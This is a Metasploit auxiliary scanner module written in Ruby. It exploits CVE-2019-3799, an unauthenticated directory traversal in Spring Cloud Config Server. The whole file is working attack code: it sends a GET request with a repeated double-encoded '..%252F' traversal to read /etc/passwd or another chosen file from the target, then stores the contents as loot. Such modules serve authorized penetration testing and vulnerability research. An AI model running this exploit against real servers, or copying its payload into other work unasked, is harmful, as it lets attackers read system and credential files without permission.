##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Spring Cloud Config Server Directory Traversal',
      'Description' => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        which exists in Spring Cloud Config versions 2.1.x prior to 2.1.2,
        versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6. Spring
        Cloud Config listens by default on port 8888.
      },
      'References'  =>
        [
          ['CVE', '2019-3799'],
          ['URL', 'https://pivotal.io/security/cve-2019-3799']
        ],
      'Author'      =>
        [
          'Vern', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'DisclosureDate' => '2019-04-17',
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8888),
        OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])
      ])
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "#{"..%252F" * datastore['DEPTH']}#{filename}"

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/foo/default/master/#{traversal}"
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'springcloud.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
